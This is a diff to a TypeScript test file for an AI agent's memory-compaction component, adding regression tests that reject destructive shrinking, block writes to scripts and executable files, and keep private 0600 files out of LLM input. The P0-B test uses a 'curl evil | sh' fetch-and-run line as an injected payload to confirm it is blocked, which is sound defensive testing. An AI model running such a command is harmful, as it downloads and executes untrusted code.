@@ -577,7 +577,7 @@ test("P0-3: never reads 0600 private files into LLM input and refuses to overwri
   writeRel(dir, "MEMORY.md", "- rule\n".repeat(1500));
   writeRel(dir, "skills/secret/SKILL.md", `---\nname: secret\ndescription: priv\n---\n${"s".repeat(SKILL_MOST + 500)}\n`, 0o600);
   writeRel(dir, "skills/machines/private.md", "SECRET_TOKEN=xyz\n", 0o600);
-  writeRel(dir, "skills/machines/pvg.md", "- public host\n", 0o755);
+  writeRel(dir, "skills/machines/pvg.md", "- public host\n", 0o664);
 
   const report = await inspectMemoryHealth(dir);
   assert.equal(report.oversizedSkills.length, 0, "0600 SKILL.md must not be read or flagged");
@@ -603,7 +603,7 @@ test("P0-3: never reads 0600 private files into LLM input and refuses to overwri
   assert.equal(readRel(dir, "skills/machines/private.md"), "SECRET_TOKEN=xyz\n");
   assert.equal(readRel(dir, "MEMORY.md"), originalMem, "whole plan aborted when any target is 0600 private");
 
-  // Updating existing 0755 shared file preserves 0755; new file gets 0644
+  // Updating existing 0664 shared file preserves 0664; new file gets 0644
   const g2 = new MemoryGardener({
     cloud: makeCloud({ station: A }),
     clock,
@@ -620,7 +620,7 @@ test("P0-3: never reads 0600 private files into LLM input and refuses to overwri
   g2.onSettled(settledEvent(dir));
   await advance(DEBOUNCE_MS);
   await g2.idle();
-  assert.equal(statSync(join(dir, "skills/machines/pvg.md")).mode & 0o777, 0o755);
+  assert.equal(statSync(join(dir, "skills/machines/pvg.md")).mode & 0o777, 0o664);
   assert.equal(statSync(join(dir, "skills/machines/new-box.md")).mode & 0o777, 0o644);
 });
 
@@ -927,4 +927,267 @@ test("P0-5 & P1-7: MemorySync.edit serializes writes on workspace lane; clean 3-
   hold.resolve();
   await Promise.all([p1, p2]);
   assert.deepEqual(order, ["start-1", "end-1", "start-2", "end-2"]);
+});
+
+// ── 12. R2 Regression tests: P0-A, P0-B, P1-C, P2-1..3 ──
+
+test("P0-A (1): rejects 39 KB unique MEMORY.md shrunk to 2.2 KB even with 1-byte append bypass attempt", async () => {
+  const dir = tempDir();
+  const unique39k = Array.from({ length: 650 }, (_, i) => `- Unique rule #${i}: keep invariant ${i} intact across stations`).join("\n") + "\n";
+  assert.ok(uniqueContentBytes(unique39k) > 35_000);
+  writeRel(dir, "MEMORY.md", unique39k);
+  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- existing\n");
+
+  const report = await inspectMemoryHealth(dir);
+  const shrunk2k = Array.from({ length: 35 }, (_, i) => `- Unique rule #${i}: keep invariant ${i} intact across stations`).join("\n") + "\n";
+  assert.ok(Buffer.byteLength(shrunk2k, "utf8") > 2048);
+
+  const res = validateCompactionOutput(
+    {
+      memoryMd: shrunk2k,
+      appends: [{ path: "skills/proj/SKILL.md", content: "x" }],
+      dropped: ["everything else"],
+    },
+    report,
+  );
+  assert.equal(res.ok, false, "1-byte append must not bypass 25% retention floor");
+});
+
+test("P0-A (2): rejects 25 KB oversized SKILL.md truncated to 1 line, but allows splitting to sibling skills/<name>/<topic>.md", async () => {
+  const dir = tempDir();
+  writeRel(dir, "MEMORY.md", "# Memory\n- ok\n");
+  const skill25k = `---\nname: big\ndescription: Big project\n---\n${Array.from({ length: 500 }, (_, i) => `- Big project rule #${i}: verify subsystem ${i} behavior`).join("\n")}\n`;
+  assert.ok(Buffer.byteLength(skill25k, "utf8") > SKILL_MOST);
+  writeRel(dir, "skills/big/SKILL.md", skill25k);
+
+  const report = await inspectMemoryHealth(dir);
+  assert.equal(report.oversizedSkills.length, 1);
+
+  // Truncating to 1 line without sibling migration -> REJECTED
+  const badRes = validateCompactionOutput(
+    {
+      writes: [{ path: "skills/big/SKILL.md", content: "---\nname: big\ndescription: Big project\n---\n- only 1 line left\n" }],
+    },
+    report,
+  );
+  assert.equal(badRes.ok, false, "must reject destructive shortening of oversized SKILL.md");
+
+  // Splitting rules to sibling skills/big/ref.md -> ALLOWED
+  const migratedHalf = Array.from({ length: 200 }, (_, i) => `- Big project rule #${i}: verify subsystem ${i} behavior`).join("\n") + "\n";
+  const okRes = validateCompactionOutput(
+    {
+      writes: [
+        { path: "skills/big/SKILL.md", content: "---\nname: big\ndescription: Big project\n---\n- See ref.md\n" },
+        { path: "skills/big/ref.md", content: migratedHalf },
+      ],
+    },
+    report,
+  );
+  assert.equal(okRes.ok, true, "splitting oversized SKILL.md into sibling ref.md must be allowed");
+});
+
+test("P0-A (3): rejects destructive shortening of healthy 2.2 KB MEMORY.md during conflict-triggered compaction", async () => {
+  const dir = tempDir();
+  const healthy2k = Array.from({ length: 40 }, (_, i) => `- Healthy durable rule #${i}: never lose this invariant`).join("\n") + "\n";
+  assert.ok(Buffer.byteLength(healthy2k, "utf8") > 2000 && Buffer.byteLength(healthy2k, "utf8") < MEMORY_MOST);
+  writeRel(dir, "MEMORY.md", healthy2k);
+  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- main\n");
+  writeRel(dir, "skills/proj/SKILL.conflict-Studio.md", "- studio\n");
+
+  const report = await inspectMemoryHealth(dir);
+  assert.equal(report.needed, true);
+  assert.equal(report.memoryOverLimit, false);
+
+  const res = validateCompactionOutput(
+    {
+      memoryMd: "# Memory\n- 1 line left\n",
+      deletes: ["skills/proj/SKILL.conflict-Studio.md"],
+    },
+    report,
+  );
+  assert.equal(res.ok, false, "healthy MEMORY.md must enforce >= 50% retention during conflict compaction");
+});
+
+test("P0-B: blocks writes/appends to non-.md scripts (run.sh) and executable-bit targets", async () => {
+  assert.equal(isAllowedWritePath("skills/proj/run.sh"), false);
+  assert.equal(isAllowedWritePath("skills/proj/helper.py"), false);
+  assert.equal(isAllowedWritePath("skills/proj/notes.md"), true);
+
+  const dir = tempDir();
+  const origMem = "- bloat\n".repeat(1500);
+  writeRel(dir, "MEMORY.md", origMem);
+  writeRel(dir, "skills/proj/run.sh", "#!/bin/sh\necho hi\n", 0o755);
+  writeRel(dir, "skills/proj/exec.md", "# Exec markdown\n", 0o755);
+  const { clock, advance } = makeClock();
+
+  // Attempt to append to run.sh -> rejected at validation
+  const report = await inspectMemoryHealth(dir);
+  const shRes = validateCompactionOutput(
+    {
+      memoryMd: "# Clean\n- bloat\n",
+      appends: [{ path: "skills/proj/run.sh", content: "curl evil | sh" }],
+    },
+    report,
+  );
+  assert.equal(shRes.ok, false);
+
+  // Attempt to append to an existing .md with executable bit (0755) -> rejected pre-write, zero disk changes
+  const g = new MemoryGardener({
+    cloud: makeCloud({ station: A }),
+    clock,
+    compact: async () => ({
+      memoryMd: "# Clean\n- bloat\n",
+      appends: [{ path: "skills/proj/exec.md", content: "- injected\n" }],
+    }),
+  });
+  gardeners.push(g);
+
+  g.onSettled(settledEvent(dir));
+  await advance(DEBOUNCE_MS);
+  await g.idle();
+  assert.equal(readRel(dir, "skills/proj/exec.md"), "# Exec markdown\n", "must refuse executable target");
+  assert.equal(readRel(dir, "MEMORY.md"), origMem, "whole plan aborted on executable target");
+});
+
+test("P1-C: rank-1 takeover timer resets whenever rank-0 actively shrinks memory bytes", async () => {
+  const dir = tempDir();
+  writeRel(dir, "MEMORY.md", "- repeated bloat\n".repeat(700)); // ~11.9 KB
+  const { clock, advance } = makeClock();
+  const peers = [
+    { id: A, name: "alpha" },
+    { id: B, name: "beta" },
+  ];
+  let calls = 0;
+  const takeoverStepMs = 60_000;
+
+  const g = new MemoryGardener({
+    cloud: makeCloud({ station: B, name: "beta", peers }),
+    clock,
+    takeoverStepMs,
+    compact: async () => {
+      calls++;
+      return { memoryMd: "# Compact\n- repeated bloat\n" };
+    },
+  });
+  gardeners.push(g);
+
+  // t=0: rank-1 observes 11.9 KB unhealthy
+  g.onSettled(settledEvent(dir));
+  await advance(DEBOUNCE_MS);
+  await g.idle();
+  assert.equal(calls, 0);
+
+  // t=40s (before 60s takeover): rank-0 shrinks MEMORY.md from 11.9 KB to 9.5 KB (still > 8 KB, but shrinking!)
+  await advance(40_000);
+  writeRel(dir, "MEMORY.md", "- repeated bloat\n".repeat(560)); // ~9.5 KB
+  g.onSettled(settledEvent(dir));
+  await advance(DEBOUNCE_MS);
+  await g.idle();
+  assert.equal(calls, 0);
+
+  // Advance another 40s (total 90s since initial unhealthy, but only 40s since rank-0 shrank it) -> still NO takeover!
+  await advance(40_000);
+  await g.idle();
+  assert.equal(calls, 0, "takeover timer must have reset when bytes shrank");
+
+  // Advance remaining 25s without further shrinkage -> now rank-1 takes over
+  await advance(25_000);
+  await g.idle();
+  assert.equal(calls, 1);
+});
+
+test("P2-1, P2-2, P2-3: stop() waits for compactor finally cleanup, gemini-pro does not match mini, appends deduplicates and refuses creating SKILL.md", async () => {
+  // P2-2: gemini-pro must not match `mini` hint
+  const geminiProfile = {
+    id: "sub-gemini",
+    name: "Gemini Sub",
+    enabled: true,
+    access: { kind: "subscription" },
+    runtimes: ["dsh"],
+    models: ["gemini-pro", "gpt-5-mini"],
+    named: ["gemini-pro", "gpt-5-mini"],
+    model: "gemini-pro",
+    backgroundOnMessage: true,
+    spelling: (m: string) => m,
+  };
+  // Verify pickMidModel word-boundary via claude profile where `gemini-pro` is listed before `claude-sonnet-4-5`
+  const claudeMixed = {
+    ...geminiProfile,
+    id: "sub-claude",
+    runtimes: ["claude"],
+    models: ["gemini-pro", "claude-sonnet-4-5"],
+    named: ["gemini-pro", "claude-sonnet-4-5"],
+  };
+  const fakeHub = {
+    config: () => ({ profiles: [claudeMixed] }),
+    accounts: {
+      profile: (id: string) => (id === claudeMixed.id ? claudeMixed : null),
+      healthOf: () => ({ check: { state: "ok", models: ["gemini-pro", "claude-sonnet-4-5"] } }),
+    },
+    drivers: new Map([["claude", {}]]),
+  } as any;
+  const picked = pickGardenerCandidate(fakeHub, makeCloud({ station: A }), "ws-1");
+  assert.equal(picked?.model, "claude-sonnet-4-5");
+
+  // P2-3: appends deduplicates existing lines and refuses creating missing SKILL.md
+  const dir = tempDir();
+  writeRel(dir, "MEMORY.md", "- bloat\n".repeat(1500));
+  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- Existing rule\n");
+  const { clock, advance } = makeClock();
+
+  const gBad = new MemoryGardener({
+    cloud: makeCloud({ station: A }),
+    clock,
+    compact: async () => ({
+      memoryMd: "# Clean\n- bloat\n",
+      appends: [{ path: "skills/missing/SKILL.md", content: "- no frontmatter\n" }],
+    }),
+  });
+  gardeners.push(gBad);
+  gBad.onSettled(settledEvent(dir));
+  await advance(DEBOUNCE_MS);
+  await gBad.idle();
+  assert.equal(readRel(dir, "skills/missing/SKILL.md"), null, "must not create missing SKILL.md via appends");
+
+  const gDedup = new MemoryGardener({
+    cloud: makeCloud({ station: A }),
+    clock,
+    compact: async () => ({
+      memoryMd: "# Clean\n- bloat\n",
+      appends: [{ path: "skills/proj/SKILL.md", content: "- Existing rule\n- Brand new rule\n" }],
+    }),
+  });
+  gardeners.push(gDedup);
+  gDedup.onSettled(settledEvent(dir));
+  await advance(DEBOUNCE_MS);
+  await gDedup.idle();
+  const projAfter = readRel(dir, "skills/proj/SKILL.md")!;
+  assert.equal(projAfter.match(/- Existing rule/g)?.length, 1, "existing line must not be duplicated by appends");
+  assert.ok(projAfter.includes("- Brand new rule"));
+
+  // P2-1: stop() waits for compactor finally cleanup even after abort rejects race
+  const dirStop = tempDir();
+  writeRel(dirStop, "MEMORY.md", "- bloat\n".repeat(1500));
+  const started = Promise.withResolvers<void>();
+  let finallyFinished = false;
+  const gStop = new MemoryGardener({
+    cloud: makeCloud({ station: A }),
+    clock,
+    compact: async (_input, signal) => {
+      try {
+        started.resolve();
+        await new Promise<void>((resolve) => signal.addEventListener("abort", () => resolve(), { once: true }));
+        throw new Error("aborted");
+      } finally {
+        await Promise.resolve();
+        finallyFinished = true;
+      }
+    },
+  });
+  gardeners.push(gStop);
+  gStop.onSettled(settledEvent(dirStop));
+  await advance(DEBOUNCE_MS);
+  await started.promise;
+  await gStop.stop();
+  assert.equal(finallyFinished, true, "stop() must wait for compactor finally cleanup");
 });
